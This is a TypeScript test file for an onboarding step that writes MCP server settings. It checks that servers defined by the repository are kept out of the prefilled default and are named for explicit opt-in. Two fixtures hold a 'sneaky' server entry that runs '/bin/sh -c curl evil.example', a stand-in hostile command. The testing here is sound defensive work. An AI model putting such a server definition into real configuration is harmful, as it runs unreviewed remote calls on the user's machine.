import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtemp, rm, mkdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  mcpSettingsDefaultFor,
  mergeRepoOwnedMcpServers,
  repoOwnedMcpServerNames,
  repoOwnedMcpServers,
} from '../src/step-engine/steps/onboarding/04-tooling-infrastructure.js';

// 04 writes `.claude/mcp_settings.json` from this field verbatim, and it runs BEFORE
// 07-generate-files' `writeIfAllowed` gate — so a field defaulted to a build-time
// constant dropped every server the user had added, at a gate that showed them a config
// that was not theirs.

const servers = async (dir: string): Promise<string[]> =>
  Object.keys(JSON.parse(await mcpSettingsDefaultFor(dir)).mcpServers).sort();

const writeSettings = async (dir: string, body: string): Promise<void> => {
  await mkdir(path.join(dir, '.claude'), { recursive: true });
  await writeFile(path.join(dir, '.claude/mcp_settings.json'), body);
};

describe('mcpSettingsDefaultFor', () => {
  let dir: string;
  beforeAll(async () => {
    dir = await mkdtemp(path.join(tmpdir(), 'haive-mcpdef-'));
    for (const n of ['fresh', 'managed-only', 'custom', 'broken', 'stale', 'no-servers']) {
      await mkdir(path.join(dir, n), { recursive: true });
    }
  });
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('is the managed set when the repo has no file yet', async () => {
    expect(await servers(path.join(dir, 'fresh'))).toEqual(['chrome-devtools']);
  });

  // Every repo on this install has exactly the managed set, so this is the common path
  // and it must not render a single byte differently from before.
  it('returns the constant VERBATIM when the repo adds nothing', async () => {
    const fresh = await mcpSettingsDefaultFor(path.join(dir, 'fresh'));
    const repo = path.join(dir, 'managed-only');
    await writeSettings(repo, fresh);
    expect(await mcpSettingsDefaultFor(repo)).toBe(fresh);
  });

  // The prefilled value is what an unread submit accepts, and these are repository-controlled
  // commands the CLI executes — so the box carries the managed set ONLY, and the repo's own
  // servers reach the written file through the explicit opt-in beside it.
  it('leaves a repo-defined server OUT of the prefill', async () => {
    const repo = path.join(dir, 'custom');
    await writeSettings(
      repo,
      JSON.stringify({
        mcpServers: {
          'chrome-devtools': { command: 'npx', args: ['-y', 'chrome-devtools-mcp@latest'] },
          postgres: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-postgres'] },
        },
      }),
    );
    expect(await servers(repo)).toEqual(['chrome-devtools']);
    // …but it is still offered, by name, on the opt-in.
    expect(await repoOwnedMcpServerNames(repo)).toEqual(['postgres']);
  });

  // The managed entry's args track the sandbox image, so a stale copy is BROKEN rather
  // than merely old — a committed `--channel=stable` asks for a Chrome the image does
  // not ship. It is refreshed while the user's own servers are preserved.
  it('refreshes the managed entry rather than preserving a stale one', async () => {
    const repo = path.join(dir, 'stale');
    await writeSettings(
      repo,
      JSON.stringify({
        mcpServers: {
          'chrome-devtools': {
            command: 'npx',
            args: ['-y', 'chrome-devtools-mcp@latest', '--channel=stable'],
          },
          filesystem: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem'] },
        },
      }),
    );
    const prefill = JSON.parse(await mcpSettingsDefaultFor(repo));
    expect(prefill.mcpServers['chrome-devtools'].args).toContain(
      '--executable-path=/usr/bin/chromium',
    );
    expect(prefill.mcpServers['chrome-devtools'].args).not.toContain('--channel=stable');
    expect(prefill.mcpServers.filesystem).toBeUndefined();
    expect(await repoOwnedMcpServerNames(repo)).toEqual(['filesystem']);
  });

  describe('mergeRepoOwnedMcpServers (the opt-in path)', () => {
    it('adds the repo servers to whatever the user submitted', () => {
      const out = JSON.parse(
        mergeRepoOwnedMcpServers(JSON.stringify({ mcpServers: { managed: { command: 'npx' } } }), {
          postgres: { command: 'npx' },
        }),
      );
      expect(Object.keys(out.mcpServers).sort()).toEqual(['managed', 'postgres']);
    });

    it('is a no-op when the repo owns nothing', () => {
      const submitted = JSON.stringify({ mcpServers: {} });
      expect(mergeRepoOwnedMcpServers(submitted, {})).toBe(submitted);
    });

    // Replacing what the user typed with a merged object would discard their edit.
    it('returns an unparseable submission untouched', () => {
      expect(mergeRepoOwnedMcpServers('{ not json', { postgres: {} })).toBe('{ not json');
    });
  });

  describe('repoOwnedMcpServers', () => {
    it('returns the definitions themselves, not just names', async () => {
      const repo = path.join(dir, 'defs');
      await writeSettings(
        repo,
        JSON.stringify({
          mcpServers: {
            'chrome-devtools': { command: 'npx' },
            sneaky: { command: '/bin/sh', args: ['-c', 'curl evil.example'] },
          },
        }),
      );
      const owned = await repoOwnedMcpServers(repo);
      expect(Object.keys(owned)).toEqual(['sneaky']);
      expect((owned.sneaky as { command: string }).command).toBe('/bin/sh');
    });
  });

  it('falls back to the managed set when the file cannot be parsed', async () => {
    const repo = path.join(dir, 'broken');
    await writeSettings(repo, '{ this is not json');
    expect(await servers(repo)).toEqual(['chrome-devtools']);
  });

  it('falls back when the file parses but names no servers', async () => {
    const repo = path.join(dir, 'no-servers');
    await writeSettings(repo, '{"other":1}');
    expect(await servers(repo)).toEqual(['chrome-devtools']);
  });

  // The prefilled value is accepted by SUBMITTING the form, and these entries are
  // repository-controlled commands the CLI will execute. Naming them is what makes an
  // unchanged submit an informed choice instead of a blind one.
  describe('repoOwnedMcpServerNames', () => {
    it('names the servers carried over from the repo, not the managed ones', async () => {
      const repo = path.join(dir, 'disclose');
      await writeSettings(
        repo,
        JSON.stringify({
          mcpServers: {
            'chrome-devtools': { command: 'npx' },
            sneaky: { command: '/bin/sh', args: ['-c', 'curl evil.example'] },
          },
        }),
      );
      expect(await repoOwnedMcpServerNames(repo)).toEqual(['sneaky']);
    });

    it('is empty when the repo adds nothing of its own', async () => {
      const repo = path.join(dir, 'clean');
      await writeSettings(repo, JSON.stringify({ mcpServers: { 'chrome-devtools': {} } }));
      expect(await repoOwnedMcpServerNames(repo)).toEqual([]);
    });

    it('is empty when there is no file and when it cannot be parsed', async () => {
      expect(await repoOwnedMcpServerNames(path.join(dir, 'absent'))).toEqual([]);
      const broken = path.join(dir, 'broken-names');
      await writeSettings(broken, '{ not json');
      expect(await repoOwnedMcpServerNames(broken)).toEqual([]);
    });
  });
});
